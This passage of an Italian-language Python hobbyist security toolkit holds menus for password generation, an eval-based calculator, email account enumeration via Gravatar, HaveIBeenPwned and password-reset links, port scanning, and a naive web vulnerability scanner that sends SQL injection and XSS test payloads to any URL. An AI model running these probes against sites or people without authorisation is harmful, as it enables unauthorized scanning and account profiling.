                print(f"{YELLOW}[?] {name}: risposta {r.status_code}{RESET}")
        except Exception as e:
            print(f"{YELLOW}[!] {name}: errore o timeout.{RESET}")

def password_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Generatore password sicure =={RESET}")
    passwords = set()
    while len(passwords) < 20:
        pwd = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))
        passwords.add(pwd)
    for i, pwd in enumerate(passwords, 1):
        print(f"{i:02d}: {GREEN}{pwd}{RESET}")

def username_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Generatore username creativi =={RESET}")
    adjectives = ["Fast", "Crazy", "Silent", "Red", "Blue", "Dark", "Happy", "Lucky", "Smart", "Wild"]
    nouns = ["Tiger", "Wolf", "Eagle", "Shark", "Panther", "Falcon", "Lion", "Bear", "Fox", "Dragon"]
    usernames = set()
    while len(usernames) < 20:
        username = random.choice(adjectives) + random.choice(nouns) + str(random.randint(10, 9999))
        usernames.add(username)
    for i, u in enumerate(usernames, 1):
        print(f"{i:02d}: {YELLOW}{u}{RESET}")

def base64_converter_tool():
    import base64
    clear()
    print(f"{BOLD}{CYAN}== Convertitore testo in base64 =={RESET}")
    text = input("Inserisci il testo da convertire: ").strip()
    encoded = base64.b64encode(text.encode("utf-8")).decode("utf-8")
    print(f"{GREEN}Testo codificato in base64:\n{encoded}{RESET}")

def calculator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Calcolatrice avanzata =={RESET}")
    print("Scrivi un'espressione matematica (es: 2+2*3) oppure 'exit' per tornare al menu.")
    while True:
        expr = input(f"{YELLOW}>>> {RESET}")
        if expr.lower() == "exit":
            break
        try:
            result = eval(expr, {"__builtins__": {}})
            print(f"{GREEN}Risultato: {result}{RESET}")
        except Exception as e:
            print(f"{RED}Errore: {e}{RESET}")

def email_tracker_ascii_art():
    ascii_art = """
.:+*#%%#####*++++-.
                :#%%*+*+-.....
             .=%%+++:..
           .=%#++=.
          -%%+++.
      .  =%%++-          ....
      #%+#%++=.        .:#%%%*:
      :#@%#+=          :*+:-*%#:
       .*@@#.         .-%*::-%%#.
        .-%@@%-.      .=%%--%%%- 
          .:--=*+-:.:-#%%%%%%%%*.                       
               .:-*#%%%%%%%%%%%%%-                     
                  .+%%%*+*%%%%%%%%+...                 
                  .+%@@%%%%*#%%%%%%%%%*-.              
                   .*%@%%%%%%%%%%%%%%%%%#-.           
                   .*%%%%%%%%%%%+#%%%%%%%%%*-.         
                  .=%%%%%%%%%%%%@%*%%%%%####=-==
                  :*%%%%%%%%%%%%%%%*#%%%%#+=-==+
                 .+=*%#%%%%%%%%%%%%%**%%#+**+-:-
                .-=::*-%%%%%%%%%%%%###*-*%###+:
                ...:..%%%%%%%%%%%%%%#:=*+-:.
                     *%%%%%%%%%%%%%%%%.
                    :#%%%%%%%%%%%%%%%%+
                   .*%%%%%%%%%%%%%%%%%#.
                  .=%%%%%%%%%%%%%%%%%%#:
                  .+%%%%%%%%%%%%%%%%%%%*.
                    :+*#%%%@%%%%%%%%%%%%#:
    """
    print_ascii_fade(ascii_art, delay=0.03)

def email_tracker_tool():
    clear()
    email_tracker_ascii_art()
    print(f"{BOLD}{CYAN}== Email tracker (OSINT legale) =={RESET}")
    email = input("Inserisci l'email da tracciare: ").strip().lower()
    print(f"\n{CYAN}Sto cercando su alcuni servizi pubblici...{RESET}\n")

  
    gravatar_hash = hashlib.md5(email.encode('utf-8')).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{gravatar_hash}?d=404"
    try:
        r = requests.get(gravatar_url, timeout=5)
        if r.status_code == 200:
            print(f"{GREEN}[✓] Gravatar: esiste un avatar per questa email!{RESET}")
        else:
            print(f"{RED}[✗] Gravatar: nessun avatar trovato.{RESET}")
    except Exception:
        print(f"{YELLOW}[!] Gravatar: errore o timeout.{RESET}")

    
    hibp_url = f"https://haveibeenpwned.com/unifiedsearch/{email}"
    try:
        r = requests.get(hibp_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=7)
        if r.status_code == 200 and '"PwnCount":' in r.text:
            print(f"{GREEN}[✓] HaveIBeenPwned: questa email è stata trovata in breach pubblici!{RESET}")
        else:
            print(f"{YELLOW}[?] HaveIBeenPwned: nessun breach pubblico trovato.{RESET}")
    except Exception:
        print(f"{YELLOW}[!] HaveIBeenPwned: errore o timeout.{RESET}")

   
    print(f"\n{CYAN}Verifica manuale consigliata su questi servizi:{RESET}")
    services = {
        "Facebook": f"https://www.facebook.com/login/identify/?email={email}",
        "Twitter/X": f"https://twitter.com/account/begin_password_reset?email={email}",
        "Instagram": f"https://www.instagram.com/accounts/password/reset/?email={email}",
        "LinkedIn": f"https://www.linkedin.com/checkpoint/rp/request-password-reset?email={email}",
        "Google": f"https://accounts.google.com/signin/v2/usernamerecovery?Email={email}",
        "Adobe": f"https://account.adobe.com/",
    }
    for name, url in services.items():
        print(f"{BLUE}- {name}: {url}{RESET}")

    print(f"\n{YELLOW}Per i social e servizi, apri il link e verifica se l'email è riconosciuta dal sistema di recupero password.{RESET}")

def website_info_scanner_menu():
    clear()
    print(f"{BOLD}{CYAN}== Website Info Scanner Menu =={RESET}")
    while True:
        print(f"\n{PURPLE}1{RESET} - Website info scanner (trova tutte le info su un sito, compreso IP e porte aperte)")
        print(f"{PURPLE}2{RESET} - Website URL scanner (scansiona un URL e prendi tutte le info possibili)")
        print(f"{PURPLE}0{RESET} - Torna al menu principale\n")
        scelta = input(f"{CYAN}Seleziona un'opzione (1/2/0): {RESET}").strip()
        if scelta == "1":
            website_info_scanner()
        elif scelta == "2":
            website_url_scanner()
        elif scelta == "0":
            break
        else:
            print(f"{RED}Scelta non valida.{RESET}")
            time.sleep(1)

def website_info_scanner():
    clear()
    print(f"{BOLD}{CYAN}== Website Info Scanner =={RESET}")
    website = input("Inserisci il nome del sito (es: google.com): ").strip()
    if not website:
        print(f"{RED}Sito non valido.{RESET}")
        return
    try:
        
        import subprocess
    except ImportError:
        print(f"{YELLOW}Installazione libreria necessaria...{RESET}")
        
        import subprocess

  
    try:
        ip = socket.gethostbyname(website)
        print(f"{YELLOW}IP Address:{RESET} {ip}")
    except Exception as e:
        print(f"{RED}Errore nel ottenere IP: {e}{RESET}")

 
    try:
        w = whois.whois(website)
        print(f"{YELLOW}Whois Info:{RESET}")
        print(f"  Domain: {w.domain_name}")
        print(f"  Registrar: {w.registrar}")
        print(f"  Creation Date: {w.creation_date}")
        print(f"  Expiration Date: {w.expiration_date}")
        print(f"  Name Servers: {w.name_servers}")
    except Exception as e:
        print(f"{RED}Errore nel whois: {e}{RESET}")

    
    print(f"{YELLOW}Scansione porte comuni (21,22,23,25,53,80,110,143,443,993,995):{RESET}")
    common_ports = [21,22,23,25,53,80,110,143,443,993,995]
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"  Porta {port}: APERTA")
            else:
                print(f"  Porta {port}: CHIUSA")
            sock.close()
        except Exception as e:
            print(f"  Porta {port}: ERRORE - {e}")

def website_url_scanner():
    clear()
    print(f"{BOLD}{CYAN}== Website URL Scanner =={RESET}")
    url = input("Inserisci l'URL completo (es: https://google.com): ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        response = requests.get(url, timeout=10)
        print(f"{YELLOW}Status Code:{RESET} {response.status_code}")
        print(f"{YELLOW}Headers:{RESET}")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")
        print(f"{YELLOW}Content-Type:{RESET} {response.headers.get('Content-Type', 'N/A')}")
        print(f"{YELLOW}Server:{RESET} {response.headers.get('Server', 'N/A')}")
        print(f"{YELLOW}Content Length:{RESET} {response.headers.get('Content-Length', 'N/A')}")
        #
        if url.startswith('https'):
            try:
                hostname = url.split('://')[1].split('/')[0]
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        print(f"{YELLOW}SSL Certificate Info:{RESET}")
                        print(f"  Subject: {cert.get('subject', 'N/A')}")
                        print(f"  Issuer: {cert.get('issuer', 'N/A')}")
                        print(f"  Valid From: {cert.get('notBefore', 'N/A')}")
                        print(f"  Valid To: {cert.get('notAfter', 'N/A')}")
            except Exception as e:
                print(f"{RED}Errore SSL: {e}{RESET}")
    except Exception as e:
        print(f"{RED}Errore nella richiesta: {e}{RESET}")

def vulnerability_scanner_tool():
    clear()
    print(f"{BOLD}{CYAN}== Vulnerability Scanner per Siti Web =={RESET}")
    url = input("Inserisci l'URL del sito da scansionare: ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    print(f"{CYAN}Scansione in corso...{RESET}")
    vulnerabilities = []

    
    try:
        test_url = url + "'"
        response = requests.get(test_url, timeout=5)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            vulnerabilities.append("Possibile SQL Injection")
    except:
        pass

   
    try:
        test_url = url + "?q=<script>alert('xss')</script>"
        response = requests.get(test_url, timeout=5)
        if "<script>" in response.text:
            vulnerabilities.append("Possibile XSS")
    except:
        pass

   
    common_dirs = ["/admin", "/backup", "/config", "/db", "/logs"]
    for d in common_dirs:
        try:
            test_url = url.rstrip('/') + d
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                vulnerabilities.append(f"Directory aperta: {d}")
        except:
            pass

   
    try:
        response = requests.get(url, timeout=10)
        if 'X-Frame-Options' not in response.headers:
            vulnerabilities.append("Manca header X-Frame-Options (possibile clickjacking)")
        if 'Content-Security-Policy' not in response.headers:
            vulnerabilities.append("Manca Content Security Policy")
        if response.headers.get('Server'):
            server = response.headers['Server'].lower()
            if 'apache' in server and '2.4' not in server:
                vulnerabilities.append("Server Apache possibilmente obsoleto")
    except:
        pass

    if vulnerabilities:
        print(f"{RED}Vulnerabilità trovate:{RESET}")
        for v in vulnerabilities:
            print(f"  - {v}")
    else:
        print(f"{GREEN}Nessuna vulnerabilità evidente trovata.{RESET}")

if __name__ == "__main__":
    check_dependencies()
    set_fullscreen()
    print(f"{CYAN}benvenuto, inserisci la password:{RESET}", end=" ")
    pw = input().strip()
    if pw != "2060":
        print(f"{RED}Password errata. Uscita...{RESET}")
        time.sleep(2)
        sys.exit(1)

    menu()
